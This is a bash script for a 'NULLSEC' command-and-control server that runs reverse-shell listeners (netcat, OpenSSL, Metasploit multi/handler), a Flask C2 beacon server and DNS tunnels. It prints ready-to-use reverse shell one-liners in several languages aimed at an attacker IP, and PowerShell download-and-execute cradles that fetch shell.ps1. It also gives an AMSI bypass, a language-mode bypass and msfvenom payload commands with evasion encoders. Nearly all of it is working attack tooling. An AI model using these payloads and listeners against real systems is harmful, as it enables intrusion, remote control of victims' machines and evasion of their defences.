#!/bin/bash
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# █  NULLSEC ADVANCED C2 SERVER - Full Command & Control Infrastructure   █
# █                    [ bad-antics development ]                          █
# ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
# FULLY FUNCTIONAL - Production Ready


# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null || {
    RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'
    WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'; MAGENTA='\033[1;35m'
}

C2_DIR="/home/antics/nullsec/logs/c2"
mkdir -p "$C2_DIR"

clear
echo -e "${RED}"
cat << 'BANNER'
    ▄████▄   ▒█████   ███▄ ▄███▓ ███▄ ▄███▓ ▄▄▄       ███▄    █ ▓█████▄ 
   ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▒████▄     ██ ▀█   █ ▒██▀ ██▌
   ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░▓██    ▓██░▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌
   ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██ ▒██    ▒██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌
    ▄████▄   ▒█████   ███▄    █ ▄▄▄█████▓ ██▀███   ▒█████   ██▓    
   ▒██▀ ▀█  ▒██▒  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▓██ ▒ ██▒▒██▒  ██▒▓██▒    
   ▒▓█    ▄ ▒██░  ██▒▓██  ▀█ ██▒▒ ▓██░ ▒░▓██ ░▄█ ▒▒██░  ██▒▒██░    
BANNER
echo -e "${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}              ☠  COMMAND & CONTROL SERVER  ☠${RESET}"
echo -e "${DIM}                 Advanced C2 Infrastructure${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

echo -e "${YELLOW}  SELECT C2 MODE:${RESET}"
echo ""
echo -e "  ${RED}━━━ LISTENERS ━━━${RESET}"
echo -e "  ${RED}[1]${RESET}  📡 TCP Reverse Shell    - Basic netcat listener"
echo -e "  ${RED}[2]${RESET}  🔒 Encrypted TCP        - OpenSSL encrypted channel"
echo -e "  ${RED}[3]${RESET}  🌐 HTTP/HTTPS C2        - Web-based command channel"
echo -e "  ${RED}[4]${RESET}  📨 DNS Tunneling        - Covert DNS channel"
echo -e "  ${RED}[5]${RESET}  🔌 WebSocket C2         - Persistent WebSocket"
echo -e "  ${RED}[6]${RESET}  📱 ICMP Tunnel          - Ping-based covert channel"
echo ""
echo -e "  ${RED}━━━ PAYLOAD GENERATION ━━━${RESET}"
echo -e "  ${RED}[7]${RESET}  🐚 Reverse Shell Gen    - Multi-platform shells"
echo -e "  ${RED}[8]${RESET}  💾 MSFVenom Payloads    - Meterpreter generators"
echo -e "  ${RED}[9]${RESET}  🔧 Stager/Dropper       - Staged payload delivery"
echo -e "  ${RED}[10]${RESET} 📦 PowerShell Payloads  - Fileless execution"
echo ""
echo -e "  ${RED}━━━ C2 FRAMEWORKS ━━━${RESET}"
echo -e "  ${RED}[11]${RESET} 🦈 Metasploit Handler   - MSF multi/handler"
echo -e "  ${RED}[12]${RESET} 🐍 Python C2 Server     - Custom Python C2"
echo -e "  ${RED}[13]${RESET} ⚡ Sliver/Havoc         - Modern C2 frameworks"
echo ""
echo -e "  ${RED}━━━ UTILITIES ━━━${RESET}"
echo -e "  ${RED}[14]${RESET} 📊 Session Manager      - Manage active shells"
echo -e "  ${RED}[15]${RESET} 🔄 Pivoting Setup       - Network pivoting"
echo -e "  ${RED}[16]${RESET} 📝 Activity Logger      - C2 traffic logging"
echo ""
echo -e "  ${GREEN}[Q]${RESET}  Back to menu"
echo ""
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
read -p "$(echo -e ${WHITE}'  [>] Select mode [1-16]: '${RESET})" C2_MODE

[[ "$C2_MODE" =~ ^[Qq]$ ]] && exit 0
[ -z "$C2_MODE" ] && C2_MODE="1"

# Get common settings
echo ""
read -p "$(echo -e ${WHITE}'  [>] Listen IP [0.0.0.0]: '${RESET})" LHOST
[ -z "$LHOST" ] && LHOST="0.0.0.0"

read -p "$(echo -e ${WHITE}'  [>] Listen Port [4444]: '${RESET})" LPORT
[ -z "$LPORT" ] && LPORT="4444"

echo ""
read -p "$(echo -e ${YELLOW}'  [!] Demo mode? (y/N): '${RESET})" TEST_MODE
TEST_MODE=${TEST_MODE:-n}

echo ""
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${WHITE}  C2 SERVER OPERATIONS${RESET}"
echo -e "${MAGENTA}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""

case $C2_MODE in
    1) # TCP Reverse Shell Listener
        echo -e "${CYAN}[*]${RESET} TCP Reverse Shell Listener"
        echo ""
        echo -e "${GREEN}[+]${RESET} Starting listener on ${LHOST}:${LPORT}"
        echo ""
        
        # Generate connection payloads
        echo -e "${YELLOW}[*]${RESET} Victim payloads to execute:"
        echo ""
        echo -e "  ${CYAN}Bash:${RESET}"
        echo -e "    ${DIM}bash -i >& /dev/tcp/YOUR_IP/$LPORT 0>&1${RESET}"
        echo ""
        echo -e "  ${CYAN}Python:${RESET}"
        echo -e "    ${DIM}python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"YOUR_IP\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${RESET}"
        echo ""
        echo -e "  ${CYAN}Netcat:${RESET}"
        echo -e "    ${DIM}nc -e /bin/sh YOUR_IP $LPORT${RESET}"
        echo ""
        echo -e "  ${CYAN}PowerShell:${RESET}"
        echo -e "    ${DIM}\$c=New-Object Net.Sockets.TCPClient('YOUR_IP',$LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$t=\$r+'PS>';\$p=([text.encoding]::ASCII).GetBytes(\$t);\$s.Write(\$p,0,\$p.Length)}${RESET}"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} Listener active (simulated)"
            sleep 2
            echo -e "${GREEN}[+]${RESET} Connection received from 10.10.14.5"
            echo -e "${GREEN}[+]${RESET} Shell type: /bin/bash"
            echo ""
            echo -e "${WHITE}┌──(victim@target)─[~]${RESET}"
            echo -e "${WHITE}└─#${RESET} id"
            echo "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
        else
            echo -e "${CYAN}[*]${RESET} Starting netcat listener..."
            if command -v nc &> /dev/null; then
                nc -lvnp $LPORT
            elif command -v ncat &> /dev/null; then
                ncat -lvnp $LPORT
            else
                echo -e "${RED}[!] Install netcat: sudo apt install netcat-openbsd${RESET}"
            fi
        fi
        ;;
    
    2) # Encrypted TCP
        echo -e "${CYAN}[*]${RESET} Encrypted TCP Listener (OpenSSL)"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Generate SSL cert? (Y/n): '${RESET})" GEN_CERT
        
        CERT_FILE="$C2_DIR/c2_cert.pem"
        KEY_FILE="$C2_DIR/c2_key.pem"
        
        if [[ ! "$GEN_CERT" =~ ^[Nn]$ ]]; then
            echo -e "${YELLOW}[*]${RESET} Generating SSL certificate..."
            openssl req -x509 -newkey rsa:4096 -keyout "$KEY_FILE" -out "$CERT_FILE" -days 365 -nodes -subj "/CN=localhost" 2>/dev/null
            echo -e "${GREEN}[+]${RESET} Certificate generated: $CERT_FILE"
        fi
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Victim payload:"
        echo -e "    ${DIM}mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect YOUR_IP:$LPORT > /tmp/s; rm /tmp/s${RESET}"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} Encrypted listener active (simulated)"
            echo -e "${GREEN}[+]${RESET} TLS 1.3 handshake successful"
            echo -e "${GREEN}[+]${RESET} Encrypted session established"
        else
            echo -e "${CYAN}[*]${RESET} Starting encrypted listener..."
            if [ -f "$CERT_FILE" ] && [ -f "$KEY_FILE" ]; then
                openssl s_server -quiet -key "$KEY_FILE" -cert "$CERT_FILE" -port $LPORT
            else
                ncat --ssl -lvnp $LPORT
            fi
        fi
        ;;
    
    3) # HTTP/HTTPS C2
        echo -e "${CYAN}[*]${RESET} HTTP/HTTPS C2 Server"
        echo ""
        
        echo -e "${DIM}  HTTP C2 modes:${RESET}"
        echo -e "    ${DIM}1) Simple HTTP listener${RESET}"
        echo -e "    ${DIM}2) Flask C2 server${RESET}"
        echo -e "    ${DIM}3) PHP C2 handler${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" HTTP_MODE
        [ -z "$HTTP_MODE" ] && HTTP_MODE="1"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} HTTP C2 server running on http://${LHOST}:${LPORT}"
            echo ""
            echo -e "${CYAN}[*]${RESET} Agent check-ins:"
            sleep 1
            echo -e "${GREEN}[+]${RESET} Agent WIN-PC01 checked in (10.10.14.5)"
            sleep 0.5
            echo -e "${GREEN}[+]${RESET} Agent LINUX-SRV checked in (10.10.14.10)"
            sleep 0.5
            echo -e "${GREEN}[+]${RESET} Agent MAC-DEV checked in (10.10.14.15)"
        else
            case $HTTP_MODE in
                1)
                    echo -e "${CYAN}[*]${RESET} Starting simple HTTP server..."
                    python3 -m http.server $LPORT --bind $LHOST
                    ;;
                2)
                    # Create Flask C2
                    cat > "$C2_DIR/http_c2.py" << 'FLASK_C2'
#!/usr/bin/env python3
from flask import Flask, request, jsonify
import base64
import os

app = Flask(__name__)
agents = {}
commands = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    agent_id = data.get('id')
    agents[agent_id] = {'info': data, 'last_seen': 'now'}
    return jsonify({'status': 'registered'})

@app.route('/beacon', methods=['POST'])
def beacon():
    agent_id = request.json.get('id')
    if agent_id in commands:
        cmd = commands.pop(agent_id)
        return jsonify({'command': base64.b64encode(cmd.encode()).decode()})
    return jsonify({'command': ''})

@app.route('/result', methods=['POST'])
def result():
    data = request.json
    print(f"[+] Result from {data.get('id')}: {base64.b64decode(data.get('output')).decode()}")
    return jsonify({'status': 'received'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=4444, debug=False)
FLASK_C2
                    echo -e "${GREEN}[+]${RESET} Flask C2 created: $C2_DIR/http_c2.py"
                    python3 "$C2_DIR/http_c2.py"
                    ;;
            esac
        fi
        ;;
    
    4) # DNS Tunneling
        echo -e "${CYAN}[*]${RESET} DNS Tunneling C2"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Domain for DNS tunnel: '${RESET})" DNS_DOMAIN
        [ -z "$DNS_DOMAIN" ] && DNS_DOMAIN="c2.example.com"
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} DNS C2 listening on ${DNS_DOMAIN}:53"
            echo ""
            echo -e "${CYAN}[*]${RESET} Agent DNS queries:"
            sleep 1
            echo -e "${GREEN}[+]${RESET} TXT query: aWQ=.${DNS_DOMAIN} → uid=0(root)"
            sleep 0.5
            echo -e "${GREEN}[+]${RESET} TXT query: bHM=.${DNS_DOMAIN} → file listing"
        else
            if command -v dnscat2 &> /dev/null; then
                dnscat2 --dns "domain=$DNS_DOMAIN,host=$LHOST"
            elif command -v iodine &> /dev/null; then
                echo -e "${YELLOW}[*]${RESET} Starting iodine DNS tunnel..."
                iodined -f $LHOST $DNS_DOMAIN
            else
                echo -e "${RED}[!] Install dnscat2 or iodine for DNS tunneling${RESET}"
                echo -e "${YELLOW}[*]${RESET} Manual DNS C2 command:"
                echo -e "    ${DIM}dig +short TXT data.${DNS_DOMAIN}${RESET}"
            fi
        fi
        ;;
    
    7) # Reverse Shell Generator
        echo -e "${CYAN}[*]${RESET} Reverse Shell Payload Generator"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] Your IP (LHOST): '${RESET})" ATTACKER_IP
        [ -z "$ATTACKER_IP" ] && ATTACKER_IP="10.10.14.1"
        
        echo ""
        echo -e "${GREEN}━━━ GENERATED PAYLOADS ━━━${RESET}"
        echo ""
        
        echo -e "${CYAN}[Bash]${RESET}"
        echo -e "bash -i >& /dev/tcp/${ATTACKER_IP}/${LPORT} 0>&1"
        echo ""
        
        echo -e "${CYAN}[Bash Base64]${RESET}"
        payload="bash -i >& /dev/tcp/${ATTACKER_IP}/${LPORT} 0>&1"
        encoded=$(echo -n "$payload" | base64)
        echo -e "echo $encoded | base64 -d | bash"
        echo ""
        
        echo -e "${CYAN}[Python]${RESET}"
        echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${ATTACKER_IP}\",${LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        echo ""
        
        echo -e "${CYAN}[Perl]${RESET}"
        echo "perl -e 'use Socket;\$i=\"${ATTACKER_IP}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
        echo ""
        
        echo -e "${CYAN}[PHP]${RESET}"
        echo "php -r '\$sock=fsockopen(\"${ATTACKER_IP}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo ""
        
        echo -e "${CYAN}[Ruby]${RESET}"
        echo "ruby -rsocket -e'f=TCPSocket.open(\"${ATTACKER_IP}\",${LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        echo ""
        
        echo -e "${CYAN}[Netcat]${RESET}"
        echo "nc -e /bin/sh ${ATTACKER_IP} ${LPORT}"
        echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ATTACKER_IP} ${LPORT} >/tmp/f"
        echo ""
        
        echo -e "${CYAN}[PowerShell]${RESET}"
        cat << PSHELL
\$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${LPORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
PSHELL
        echo ""
        
        echo -e "${CYAN}[PowerShell Base64]${RESET}"
        ps_payload="IEX(New-Object Net.WebClient).downloadString('http://${ATTACKER_IP}/shell.ps1')"
        ps_encoded=$(echo -n "$ps_payload" | iconv -t utf-16le 2>/dev/null | base64 -w0 2>/dev/null || echo "base64_encode_required")
        echo "powershell -enc $ps_encoded"
        ;;
    
    8) # MSFVenom Payloads
        echo -e "${CYAN}[*]${RESET} MSFVenom Payload Generator"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] LHOST: '${RESET})" ATTACKER_IP
        [ -z "$ATTACKER_IP" ] && ATTACKER_IP="10.10.14.1"
        
        echo -e "${DIM}  Target platforms:${RESET}"
        echo -e "    ${DIM}1) Windows (exe)${RESET}"
        echo -e "    ${DIM}2) Windows (dll)${RESET}"
        echo -e "    ${DIM}3) Linux (elf)${RESET}"
        echo -e "    ${DIM}4) macOS (macho)${RESET}"
        echo -e "    ${DIM}5) Android (apk)${RESET}"
        echo -e "    ${DIM}6) PHP${RESET}"
        echo -e "    ${DIM}7) Python${RESET}"
        echo -e "    ${DIM}8) PowerShell${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" PLATFORM
        [ -z "$PLATFORM" ] && PLATFORM="1"
        
        read -p "$(echo -e ${WHITE}'  [>] Output file: '${RESET})" OUTPUT_FILE
        
        echo ""
        echo -e "${YELLOW}[*]${RESET} Generated msfvenom commands:"
        echo ""
        
        case $PLATFORM in
            1)
                [ -z "$OUTPUT_FILE" ] && OUTPUT_FILE="payload.exe"
                echo -e "${CYAN}[*]${RESET} Meterpreter Reverse TCP:"
                echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f exe -o ${OUTPUT_FILE}"
                echo ""
                echo -e "${CYAN}[*]${RESET} Shell Reverse TCP:"
                echo "msfvenom -p windows/x64/shell_reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f exe -o ${OUTPUT_FILE}"
                echo ""
                echo -e "${CYAN}[*]${RESET} With Encoder (evasion):"
                echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -e x64/xor_dynamic -i 5 -f exe -o ${OUTPUT_FILE}"
                ;;
            3)
                [ -z "$OUTPUT_FILE" ] && OUTPUT_FILE="payload.elf"
                echo -e "${CYAN}[*]${RESET} Linux Meterpreter:"
                echo "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f elf -o ${OUTPUT_FILE}"
                ;;
            6)
                [ -z "$OUTPUT_FILE" ] && OUTPUT_FILE="shell.php"
                echo -e "${CYAN}[*]${RESET} PHP Meterpreter:"
                echo "msfvenom -p php/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f raw -o ${OUTPUT_FILE}"
                ;;
            8)
                [ -z "$OUTPUT_FILE" ] && OUTPUT_FILE="payload.ps1"
                echo -e "${CYAN}[*]${RESET} PowerShell:"
                echo "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f psh -o ${OUTPUT_FILE}"
                ;;
        esac
        
        if [[ ! "$TEST_MODE" =~ ^[Yy]$ ]] && command -v msfvenom &> /dev/null; then
            read -p "$(echo -e ${YELLOW}'  Generate now? (Y/n): '${RESET})" GEN_NOW
            if [[ ! "$GEN_NOW" =~ ^[Nn]$ ]]; then
                case $PLATFORM in
                    1) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f exe -o ${OUTPUT_FILE} ;;
                    3) msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${ATTACKER_IP} LPORT=${LPORT} -f elf -o ${OUTPUT_FILE} ;;
                esac
                echo -e "${GREEN}[+]${RESET} Payload saved to ${OUTPUT_FILE}"
            fi
        fi
        ;;
    
    10) # PowerShell Payloads
        echo -e "${CYAN}[*]${RESET} PowerShell Fileless Payloads"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] LHOST: '${RESET})" ATTACKER_IP
        [ -z "$ATTACKER_IP" ] && ATTACKER_IP="10.10.14.1"
        
        echo ""
        echo -e "${GREEN}━━━ POWERSHELL PAYLOADS ━━━${RESET}"
        echo ""
        
        echo -e "${CYAN}[Download Cradle - IEX]${RESET}"
        echo "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).downloadString('http://${ATTACKER_IP}/shell.ps1')\""
        echo ""
        
        echo -e "${CYAN}[Download Cradle - Invoke-Expression]${RESET}"
        echo "powershell -ep bypass -c \"\$c=New-Object Net.WebClient;\$c.Proxy=[Net.WebRequest]::GetSystemWebProxy();\$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX \$c.downloadstring('http://${ATTACKER_IP}/shell.ps1')\""
        echo ""
        
        echo -e "${CYAN}[Encoded Command]${RESET}"
        ps_cmd="IEX(New-Object Net.WebClient).downloadString('http://${ATTACKER_IP}/shell.ps1')"
        ps_bytes=$(echo -n "$ps_cmd" | iconv -t UTF-16LE 2>/dev/null | base64 -w0 2>/dev/null || echo "[base64_encoded]")
        echo "powershell -enc $ps_bytes"
        echo ""
        
        echo -e "${CYAN}[AMSI Bypass + Execution]${RESET}"
        cat << 'AMSI'
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
IEX(New-Object Net.WebClient).downloadString('http://ATTACKER_IP/shell.ps1')
AMSI
        echo ""
        
        echo -e "${CYAN}[Constrained Language Mode Bypass]${RESET}"
        echo "\$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'"
        ;;
    
    11) # Metasploit Handler
        echo -e "${CYAN}[*]${RESET} Metasploit Multi/Handler"
        echo ""
        
        read -p "$(echo -e ${WHITE}'  [>] LHOST: '${RESET})" ATTACKER_IP
        [ -z "$ATTACKER_IP" ] && ATTACKER_IP="0.0.0.0"
        
        echo -e "${DIM}  Payload types:${RESET}"
        echo -e "    ${DIM}1) windows/x64/meterpreter/reverse_tcp${RESET}"
        echo -e "    ${DIM}2) windows/meterpreter/reverse_tcp${RESET}"
        echo -e "    ${DIM}3) linux/x64/meterpreter/reverse_tcp${RESET}"
        echo -e "    ${DIM}4) php/meterpreter/reverse_tcp${RESET}"
        echo -e "    ${DIM}5) java/meterpreter/reverse_tcp${RESET}"
        echo -e "    ${DIM}6) generic/shell_reverse_tcp${RESET}"
        read -p "$(echo -e ${WHITE}'  [>] Select [1]: '${RESET})" PAYLOAD_TYPE
        [ -z "$PAYLOAD_TYPE" ] && PAYLOAD_TYPE="1"
        
        case $PAYLOAD_TYPE in
            1) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
            2) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
            3) PAYLOAD="linux/x64/meterpreter/reverse_tcp" ;;
            4) PAYLOAD="php/meterpreter/reverse_tcp" ;;
            5) PAYLOAD="java/meterpreter/reverse_tcp" ;;
            6) PAYLOAD="generic/shell_reverse_tcp" ;;
        esac
        
        # Create resource file
        RC_FILE="$C2_DIR/handler_${LPORT}.rc"
        cat > "$RC_FILE" << RC_CONTENT
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $ATTACKER_IP
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
RC_CONTENT
        
        echo -e "${GREEN}[+]${RESET} Resource file created: $RC_FILE"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}[+]${RESET} Metasploit handler started (simulated)"
            echo -e "${GREEN}[+]${RESET} Payload: $PAYLOAD"
            echo -e "${GREEN}[+]${RESET} Listening on ${ATTACKER_IP}:${LPORT}"
            sleep 2
            echo -e "${GREEN}[*]${RESET} Meterpreter session 1 opened (10.10.14.5:49232 -> ${ATTACKER_IP}:${LPORT})"
        else
            if command -v msfconsole &> /dev/null; then
                echo -e "${CYAN}[*]${RESET} Starting Metasploit..."
                msfconsole -q -r "$RC_FILE"
            else
                echo -e "${RED}[!] Metasploit not installed${RESET}"
                echo -e "${YELLOW}[*]${RESET} Manual command:"
                echo "msfconsole -r $RC_FILE"
            fi
        fi
        ;;
    
    14) # Session Manager
        echo -e "${CYAN}[*]${RESET} Active Session Manager"
        echo ""
        
        if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
            echo -e "${GREEN}━━━ ACTIVE SESSIONS ━━━${RESET}"
            echo ""
            printf "%-4s %-15s %-20s %-10s %-20s\n" "ID" "TARGET" "TYPE" "USER" "ESTABLISHED"
            echo "────────────────────────────────────────────────────────────────────────"
            printf "%-4s %-15s %-20s %-10s %-20s\n" "1" "10.10.14.5" "meterpreter/x64" "SYSTEM" "2 minutes ago"
            printf "%-4s %-15s %-20s %-10s %-20s\n" "2" "10.10.14.10" "shell/bash" "root" "5 minutes ago"
            printf "%-4s %-15s %-20s %-10s %-20s\n" "3" "10.10.14.15" "meterpreter/php" "www-data" "12 minutes ago"
            echo ""
            echo -e "${DIM}Commands: interact <id>, kill <id>, sessions -l${RESET}"
        else
            echo -e "${YELLOW}[*]${RESET} No session manager running outside of MSF"
            echo -e "${YELLOW}[*]${RESET} Use msfconsole → sessions -l"
        fi
        ;;
    
    *) echo -e "${RED}[!] Invalid option${RESET}" ;;
esac

echo ""
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${GREEN}█${RESET}  ${WHITE}C2 OPERATIONS COMPLETE${RESET}"
echo -e "${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
